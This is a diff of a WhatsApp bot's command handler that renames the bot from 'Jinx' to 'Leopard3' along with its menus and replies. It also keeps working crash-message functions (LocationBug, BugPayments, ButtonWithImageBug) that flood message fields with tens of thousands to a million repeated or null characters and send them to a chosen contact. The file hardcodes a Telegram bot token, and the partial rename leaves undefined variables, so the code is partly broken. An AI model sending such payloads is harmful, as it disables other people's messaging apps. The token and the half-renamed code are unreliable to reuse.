@@ -1,12 +1,12 @@
 /*
 
 
-# Owner ? : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖓
+# Owner ? : IBRAAH LEO
 
 
 */
 const {
-samConnect,
+ibraahConnect,
 downloadContentFromMessage,
 emitGroupParticipantsUpdate,
 emitGroupUpdate,
@@ -105,7 +105,7 @@ const fonts = require('../lib/fonts.js');
 const menufont = require('../lib/menufonts.js');
 const availableStyles = Object.keys(fonts);
 const availableFontStyles = Object.keys(menufont);
-module.exports = sam = handler = async (sam, m, chatUpdate, store) => {
+module.exports = ibraah = handler = async (ibraah, m, chatUpdate, store) => {
 try {
 //=================================================//
 var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
@@ -159,7 +159,7 @@ const mime = (quoted.msg || quoted).mimetype || ""
 const qmsg = (quoted.msg || quoted)
 const isMedia = /image|video|sticker|audio/.test(mime)
 //User
-const botNumber = await sam.decodeJid(sam.user.id)
+const botNumber = await ibraah.decodeJid(ibraah.user.id)
 const itsMe = m.sender == botNumber ? true : false
 const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../grab/premium.json'), 'utf8'))
 const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../grab/owner.json'), 'utf8'))
@@ -180,7 +180,7 @@ const isNsfw = m.isGroup ? nsfw.includes(from) : false;
  const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false;
 //=================================================//
 const samido = fs.readFileSync(path.resolve(__dirname, '../derived/menu.mp3'))
-const jinx = fs.readFileSync(path.resolve(__dirname, '../derived/jinx.jpg'))
+const jinx = fs.readFileSync(path.resolve(__dirname, '../derived/LEOPARD3.jpg'))
 let antilinkall =JSON.parse(fs.readFileSync('../derived/antilinkall.json'));
 const nsfw = JSON.parse(fs.readFileSync('../derived/nsfw.json'))
 const advice = require("badadvice");
@@ -194,7 +194,7 @@ ucapanWaktu = "𝐈𝐦 𝐍𝐨𝐭 𝐖𝐞𝐚𝐤 𝐀𝐧𝐝 𝐈𝐦 𝐍
 } else if (time >= "15:00:00" && time < "19:00:00") {
 ucapanWaktu = "𝐘𝐨𝐮 𝐀𝐫𝐞 𝐓𝐡𝐞 𝐑𝐞𝐚𝐬𝐨𝐧 𝐈𝐦 𝐒𝐭𝐢𝐥𝐥 𝐀𝐥𝐢𝐯𝐞 🕊️"
 } else if (time >= "11:00:00" && time < "15:00:00") {
-ucapanWaktu = "𝐈 𝐅𝐞𝐞𝐥 𝐋𝐢𝐤𝐞 𝐘𝐨𝐮 𝐀𝐧𝐝 𝐈 𝐆𝐨𝐭 𝐎𝐟𝐟 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐫𝐨𝐧𝐠 𝐀𝐫𝐦 🦄"
+ucapanWaktu = "𝐈 𝐅𝐞𝐞𝐥 𝐋𝐢𝐤𝐞 𝐘𝐨𝐮 𝐀𝐧𝐝 𝐈 𝐆𝐨𝐭 𝐎𝐟𝐟 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐫𝐨𝐧𝐠 𝐀𝐫𝐦 🐆"
 } else if (time >= "06:00:00" && time < "11:00:00") {
 ucapanWaktu = "..𝐁𝐥𝐚𝐡, 𝐁𝐥𝐚𝐡, 𝐁𝐥𝐚𝐡, 𝐃𝐢𝐝 𝐈 𝐦𝐢𝐬𝐬 𝐚𝐧𝐲𝐭𝐡𝐢𝐧𝐠 ? 🦈"
 } else {
@@ -222,7 +222,7 @@ if (!sam.public) {
 let rn = ['recording'] 
 let jd = rn[Math.floor(Math.random() * rn.length)];
 if (m.message) {
-sam.sendPresenceUpdate(jd, from)
+ibraah.sendPresenceUpdate(jd, from)
 console.log(chalk.black(chalk.bgWhite('[ Client ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Message'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
 }
 //sam.public = false
@@ -282,7 +282,7 @@ async function addExif(webpSticker, packname, author, categories = [''], extra =
             data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
             result = {
             status: 200,
-            author: '𝕶𝖎𝖓𝖌 𝕾𝖆𝖒',
+            author: 'IBRAAH LEO',
             url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
             }
             mariayresult.push(result)
@@ -304,7 +304,7 @@ try {
         let imageUrl = await
 client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
         client.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
-        reply('*Status Download Successful: by Jinx V1*');
+        reply('*Status Download Successful: by LEOPARD3*');
       }
 
       // Check if it's a video
@@ -312,7 +312,7 @@ client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
         let videoCaption = quotedMessage.videoMessage.caption;
         let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
         client.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
-        reply('*Status Download Successful: by Jinx V1*');
+        reply('*Status Download Successful: by LEOPARD3*');
       }
     }
   }
@@ -328,7 +328,7 @@ const zyd = {
             },
             message: {
                 listResponseMessage: {
-                    'title': "🦄 JINX",
+                    'title': "🐆 LEOPARD",
                 }
             }
         };
@@ -339,7 +339,7 @@ async function LocationBug(jid) {
                         'liveLocationMessage': {
                             'degreesLatitude': 'p',
                             'degreesLongitude': 'p',
-                            'caption': "🦄 Jinx" + 'ꦾ'.repeat(50000),
+                            'caption': "🐆 Leopard3" + 'ꦾ'.repeat(50000),
                                                         'sequenceNumber': '0',
                                                         'jpegThumbnail': ''
                                                     }
@@ -363,14 +363,14 @@ async function BugPayments(jid) {
             };
             var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                 'listMessage': {
-                    'title': "🦄 Jinx" + "\0".repeat(920000),
-                                        'footerText': "🦄 Jinx",
-                                        'description': "🦄 Jinx",
+                    'title': "🐆 LEOPARD" + "\0".repeat(920000),
+                                        'footerText': "🐆 LEOPARD",
+                                        'description': "🐆 LEOPARD",
                     'buttonText': null,
                     'listType': 0x2,
                     'productListInfo': {
                         'productSections': [{
-                            'title': 'Jinx',
+                            'title': 'LEOPARD',
                             'products': [{
                                 'productId': "4392524570816732"
                             }]
@@ -438,7 +438,7 @@ async function stickerBug(jid) {
 }
 async function ButtonWithImageBug(jid) {
             const upload = {
-                upload: sam.waUploadToServer
+                upload: ibraah.waUploadToServer
             };
             const text = {
                 text: ''
@@ -446,7 +446,7 @@ async function ButtonWithImageBug(jid) {
             var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                 'interactiveMessage': {
                     'header': {
-                        'title': "🦄 JINX",
+                        'title': "🐆 LEOPARD3",
                         'hasMediaAttachment': true,
                         ...(await prepareWAMessageMedia({
                             'image': {
@@ -456,7 +456,7 @@ async function ButtonWithImageBug(jid) {
                     },
                     'body': text,
                     'footer': {
-                        'text': "›          #🦄JINX"
+                        'text': "›          #🐆LEOPARD3"
                     },
                     'nativeFlowMessage': {
                         'messageParamsJson': "\0".repeat(1000000)
@@ -466,7 +466,7 @@ async function ButtonWithImageBug(jid) {
                 'userJid': jid,
                 'quoted': zyd
             });
-            await sam.relayMessage(jid, messageContent.message, {
+            await ibraah.relayMessage(jid, messageContent.message, {
                 'participant': {
                     'jid': jid
                 },
@@ -491,7 +491,7 @@ async function sendRepeatedMessages2(jid, count) {
 	}
 	function sendMessageWithMentions(text, mentions = [], quoted = false) {
             if (quoted == null || quoted == undefined || quoted == false) {
-                return sam.sendMessage(m.chat, {
+                return ibraah.sendMessage(m.chat, {
                     'text': text,
                     'mentions': mentions
                 }, {
@@ -565,7 +565,7 @@ var lod = [
 "> 𝐇𝐞𝐥𝐥𝐨 𝐇𝐮𝐦𝐚𝐧 🇰🇪",
 "> 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐦𝐲 𝐆𝐫𝐞𝐚𝐭𝐞𝐬𝐭 𝐌𝐚𝐬𝐭𝐞𝐫 🕊️",
 "> 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐒𝐞𝐫𝐯𝐞 𝐘𝐨𝐮 🦋",
-"> 𝐌𝐲 𝐍𝐚𝐦𝐞 𝐈𝐬 .......𝐉𝐢𝐧𝐱 🦄",
+"> 𝐌𝐲 𝐍𝐚𝐦𝐞 𝐈𝐬 .......Leopard3 🐆",
 ]
 let { key } = await sam.sendMessage(from, {text: ''})
 
@@ -584,12 +584,12 @@ async function crtVid(url) {
 }
 //=================================================//
 async function prM(params) {
-    return await prepareWAMessageMedia(params, { upload: sam.waUploadToServer })
+    return await prepareWAMessageMedia(params, { upload: ibraah.waUploadToServer })
 }
 //=================================================//
 const reply = async (teks) => {
     await sleep(500)
-    return sam.sendMessage(m.chat, {
+    return ibraah.sendMessage(m.chat, {
         contextInfo: {
             mentionedJid: [
                 m.sender
@@ -597,8 +597,8 @@ const reply = async (teks) => {
             externalAdReply: {
                 showAdAttribution: false,
                 renderLargerThumbnail: false,
-                title: `𝐉𝐢𝐧𝐱🦄`,
-                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                title: `Leopard🐆`,
+                body: `𝐛𝐲 IBRAAH LEO`,
                 previewType: "VIDEO",
                 thumbnailUrl: `https://telegra.ph/file/551afec95ef19903d1a75.jpg`,
                 sourceUrl: `${global.url1}`,
@@ -760,7 +760,7 @@ let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 let nest = ` 
-     🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+     🐆 LEOPARD3 🐆
    ━━━━━━━━━━━━━━━━━
    ▣ ${ucapanWaktu} 
 
@@ -774,28 +774,28 @@ let nest = `
  ┏━━━━━━━━━━━━━━━━━◈
  ┃ ✰ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
  ┃ ✰ 𝐩𝐢𝐧𝐠
- ┃ ✰ 𝐉𝐢𝐧𝐱
- ┃ ✰ 𝐠𝐞𝐧𝐢𝐮𝐬-𝐣𝐢𝐧𝐱
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐬
+ ┃ ✰ leopard3
+ ┃ ✰ 𝐠𝐞𝐧𝐢𝐮𝐬-leopard3
+ ┃ ✰ leopard3-𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬
+ ┃ ✰ leopard3-𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐬
  ┗━━━━━━━━━━━━━━━━━◈
-> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
-sam.sendMessage(m.chat, { 
+> 𝐁𝐘 IBRAAH LEO`
+ibraah.sendMessage(m.chat, { 
 	           text: nest,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: false,
-                            title: `𝐉𝐈𝐍𝐗`,
-                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            title: `LEOPARD3`,
+                            body: `IBRAAH LEO`,
                             thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
                     }
                     
                     }),
-await sam.sendMessage(m.chat, {
+await ibraah.sendMessage(m.chat, {
 audio: samido,
 mimetype: 'audio/mpeg'
 }, { quoted: m
@@ -810,7 +810,7 @@ let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 
 //Button Menu
-let kingsam = {
+let ibraahleo = {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
@@ -819,20 +819,20 @@ interactiveMessage: {
 "isForwarded": true,
 "forwardedNewsletterMessageInfo": {
 "newsletterJid": '0@newsletter',
-"newsletterName": 'By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒',
+"newsletterName": 'By IBRAAH LEO',
 "serverMessageId": 1
 },
 },
 "header": {
 "title": nest,
-...(await prepareWAMessageMedia({ image: jinx }, { upload: sam.waUploadToServer })),
+...(await prepareWAMessageMedia({ image: leopard3 }, { upload: sam.waUploadToServer })),
 "hasMediaAttachment": true
 },
 "body": {
 "text": ""
 },
 "footer": {
-"text": "⿻  By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ⿻"
+"text": "⿻  By IBRAAH LEO ⿻"
 },
 "nativeFlowMessage": {
 "buttons": [
@@ -853,10 +853,10 @@ interactiveMessage: {
 };
 
 let kontollurus = {
-image: njix,
+image: leopard,
 caption: `Demon`,
 contextInfo:{externalAdReply:{
-title: 'JINX V1',
+title: 'LEOPARD3',
 body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
 showAdAttribution: true,
 thumbnail: ``,
@@ -877,7 +877,7 @@ let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 let nesy = ` 
-   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+   🐆 LEOPARD3 🐆
   ━━━━━━━━━━━━━━━━
   ▣ ${ucapanWaktu} 
  
@@ -885,7 +885,7 @@ let nesy = `
   ━━━━━━━━━━━━━━━━
  ┏━━━━━━━━━━━━━━━━━◈
  ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
- ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ leopard3 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
@@ -895,17 +895,17 @@ let nesy = `
  ┃ ✰ 𝐮𝐧𝐛𝐥𝐨𝐜𝐤
  ┃ ✰ 𝐥𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
  ┗━━━━━━━━━━━━━━━━━◈
-> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
-> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
-sam.sendMessage(m.chat, { 
+> Leopard3 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 IBRAAH LEO`
+ibraah.sendMessage(m.chat, { 
 	           text: nesy,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: false,
-                            title: `𝐉𝐈𝐍𝐗`,
-                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            title: `LEOPARD3`,
+                            body: `IBRAAH LEO`,
                             thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -921,7 +921,7 @@ let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 let nesy = ` 
-   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+   🐆 LEOPARD3 🐆
   ━━━━━━━━━━━━━━━━
   ▣ ${ucapanWaktu} 
  
@@ -929,7 +929,7 @@ let nesy = `
   ━━━━━━━━━━━━━━━━
  ┏━━━━━━━━━━━━━━━━━◈
  ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
- ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ leopard3 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
@@ -940,17 +940,17 @@ let nesy = `
  ┃ ✰ 𝐢𝐠
  ┃ ✰ 𝐠𝐢𝐭𝐜𝐥𝐨𝐧𝐞
  ┗━━━━━━━━━━━━━━━━━◈
-"> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
-> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
-sam.sendMessage(m.chat, { 
+"> Leopard3 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
+> 𝐁𝐘 IBRAAH LEO`
+ibraah.sendMessage(m.chat, { 
 	           text: nesy,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: false,
-                            title: `𝐉𝐈𝐍𝐗`,
-                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            title: `LEOPARD3`,
+                            body: `IBRAAH LEO`,
                             thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -960,13 +960,13 @@ sam.sendMessage(m.chat, {
                     })
                     }
                  break
- case 'genius-jinx':{
+ case 'genius-Leopard':{
 await loadings()
 let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 let kesy = ` 
-   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+   🐆 LEOPARD3 🐆
   ━━━━━━━━━━━━━━━━
   ▣ ${ucapanWaktu} 
  
@@ -974,26 +974,26 @@ let kesy = `
   ━━━━━━━━━━━━━━━━
  ┏━━━━━━━━━━━━━━━━━◈
  ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
- ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ Leopard3 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
- ┃ ✰ 𝐣𝐢𝐧𝐱-𝐚𝐢
+ ┃ ✰ leopard3-𝐚𝐢
  ┃ ✰ 𝐛𝐫𝐚𝐢𝐧-𝐚𝐢
  ┃ ✰ 𝐚𝐢
  ┃ ✰ 𝐚𝐥𝐞𝐱𝐚
  ┗━━━━━━━━━━━━━━━━━◈
-"> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
-> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
-sam.sendMessage(m.chat, { 
+"> Leopard3 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
+> 𝐁𝐘 IBRAAH LEO`
+ibraah.sendMessage(m.chat, { 
 	           text: kesy,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: false,
-                            title: `𝐉𝐈𝐍𝐗`,
-                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            title: `LEOPARD3`,
+                            body: `IBRAAH LEO`,
                             thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -1003,13 +1003,13 @@ sam.sendMessage(m.chat, {
                     })
                     }
                  break
-  case 'jinx-convert':{
+  case 'leopard3-convert':{
 await loadings()
 let timestamp = speed()
 let latensi = speed() - timestamp
 let run = runtime(process.uptime())
 let pesy = ` 
-   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
+   🐆 LEOPARD3 🐆
   ━━━━━━━━━━━━━━━━
   ▣ ${ucapanWaktu} 
  
@@ -1017,7 +1017,7 @@ let pesy = `
   ━━━━━━━━━━━━━━━━
  ┏━━━━━━━━━━━━━━━━━◈
  ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
- ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
+ ┃ ➣ Leopard3 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
  ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
  ┗━━━━━━━━━━━━━━━━━◈
  ┏━━━━━━━━━━━━━━━━━◈
@@ -1035,17 +1035,17 @@ let pesy = `
  ┃ ✰ 𝐭𝐨𝐪𝐫
  ┃ ✰ 𝐭𝐭𝐬
  ┗━━━━━━━━━━━━━━━━━◈
-> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
-> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
-sam.sendMessage(m.chat, { 
+> Leopard3 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
+> 𝐁𝐘 IBRAAH LEO`
+ibraah.sendMessage(m.chat, { 
 	           text: pesy,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `𝐉𝐈𝐍𝐗`,
-                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
+                            title: `LEOPARD3`,
+                            body: `IBRAAH LEO`,
                             thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
-                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
+                            sourceUrl: `https://whatsapp.com/channel/0029Vabz7vUJ3jutx2fNsf2P`,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -1064,9 +1064,9 @@ let latensi = speed() - timestamp
          } 
  break; 
 //=====≠==================================//
-case "jinx": { 
+case "leopard3": { 
   
- sam.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/615f4fe0243119de98dad.mp4' }, caption: `🦋${ucapanWaktu} \n🦄 𝐇𝐞𝐥𝐥𝐨 *${m.pushName}*, \n🦄 𝐈𝐭 𝐢𝐬 𝐦𝐞 𝐉𝐢𝐧𝐱\n🦄 𝐒𝐞𝐫𝐯𝐢𝐧𝐠 𝐚𝐭 𝐦𝐲 𝐛𝐞𝐬𝐭 \n🦄 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,fileLength: "9999999999898989899999999" }, { quoted: m });
+ ibraah.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/615f4fe0243119de98dad.mp4' }, caption: `🦋${ucapanWaktu} \n🦄 𝐇𝐞𝐥𝐥𝐨 *${m.pushName}*, \n🦄 𝐈𝐭 𝐢𝐬 𝐦𝐞 𝐉𝐢𝐧𝐱\n🦄 𝐒𝐞𝐫𝐯𝐢𝐧𝐠 𝐚𝐭 𝐦𝐲 𝐛𝐞𝐬𝐭 \n🦄 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,fileLength: "9999999999898989899999999" }, { quoted: m });
  }
 break;
 //========================================//
@@ -1099,14 +1099,14 @@ if(users){
 await sam.updateBlockStatus(users, "unblock")
 await reply(`Succeful unblocked user`)
 } else if(!q){
-reply("Reply to targets text 🦄")
+reply("Reply to targets text 🐆")
 }
 } else if(!isGroup){
 if(q){
 let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
 if(woke.startsWith("07")) return xreply("Start the number with 254")
 if(!woke.startsWith("254")) return xreply("Please reply to the message or tag or enter the number you want to blockk")
-await sam.updateBlockStatus(woke, "unblock")
+await ibraah.updateBlockStatus(woke, "unblock")
 reply(`Succes unblocked ${woke}`)
 } else if(!q){
 reply("Enter the number you want to unblock")
@@ -1115,8 +1115,8 @@ reply("Enter the number you want to unblock")
 }
 break
 case 'listblock':{
-let block = await sam.fetchBlocklist()
-reply('✫ 𝐉𝐈𝐍𝐗 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 ⦾ :\n\n' + `➤𝐓𝐨𝐭𝐚𝐥 : ${block == undefined ? '➵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝' : '*' + block.length + '* 𝐅𝐮𝐜𝐤 𝐘𝐨𝐮 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
+let block = await ibraah.fetchBlocklist()
+reply('✫ LEOPARD3 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 ⦾ :\n\n' + `➤𝐓𝐨𝐭𝐚𝐥 : ${block == undefined ? '➵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝' : '*' + block.length + '* 𝐅𝐮𝐜𝐤 𝐘𝐨𝐮 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
 }
 break
 //=================================================//
@@ -1145,26 +1145,26 @@ case 'setppbot':{
 if (!isDeveloper) return
 await reaction(m.chat, "✨")
 if(m.quoted){
-const media = await sam.downloadAndSaveMediaMessage(quoted)
+const media = await ibraah.downloadAndSaveMediaMessage(quoted)
 const { img } = await generateProfilePicture(media)
 await sam.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
 await reply(`${mess.success}`)
-await reaction(m.chat, "🦄")
+await reaction(m.chat, "🐆")
 } else reply("Reply photo")
 }
 break
 //=================================================//
 case 'delppbot': {
 if (!isDeveloper) return
-sam.removeProfilePicture(sam.user.id)
+sam.removeProfilePicture(ibraah.user.id)
 reply(mess.succes)
 }
 break
 //=================================================//
 case 'setbiobot':{
 if (!isDeveloper) return
-if (!q) return reply(`Send commands ${prefix+command} name\n\nuse : ${command} jinx`)
-await sam.updateProfileStatus(q)
+if (!q) return reply(`Send commands ${prefix+command} name\n\nuse : ${command} leopard3`)
+await ibraah.updateProfileStatus(q)
 await reply(`Please increase your status bio ke *${q}*`)
 }
 break
@@ -1172,7 +1172,7 @@ break
 case 'leavegc':{
 if (!isDeveloper) return
 if (!isGroup) return
-await sam.groupLeave(m.chat)
+await ibraah.groupLeave(m.chat)
 }
 break
 //=================================================//
@@ -1184,9 +1184,9 @@ if (!isAdmins) return reply(mess.admin)
 if (!/image/.test(mime)) return reply(`Reply Image with Caption ${prefix + command}`)
 if (/webp/.test(mime)) return reply(`Reply Image with  Caption ${prefix + command}`)
 let media = await sam.downloadAndSaveMediaMessage(m)
-await sam.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
+await ibraah.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
 reply('done')
-await reaction(m.chat, "🦄")}
+await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'editsubject': {
@@ -1194,7 +1194,7 @@ if (!isGroup) return reply(mess.ingroup)
 if (!isBotAdmins) return reply(mess.notadmin)
 if (!q) return reply(`Example *${prefix + command} new*`);
 await reaction(m.chat, "🫥")
-await sam.groupUpdateSubject(m.chat, text)
+await ibraah.groupUpdateSubject(m.chat, text)
 await reaction(m.chat, "✨")}
 break
 //=================================================//
@@ -1203,8 +1203,8 @@ if (!isGroup) return reply(mess.ingroup)
 if (!isBotAdmins) return reply(mess.notadmin)
 if (!q) return reply(`Example *${prefix + command} king*`);
 await reaction(m.chat, "✨")
-await sam.groupUpdateDescription(m.chat, text)
-await reaction(m.chat, "🦄")}
+await ibraah.groupUpdateDescription(m.chat, text)
+await reaction(m.chat, "🐆")}
 break
 //=================================================//
 case 'antilink': case 'linkgc': {
@@ -1212,16 +1212,16 @@ if (!isGroup) return reply(mess.ingroup)
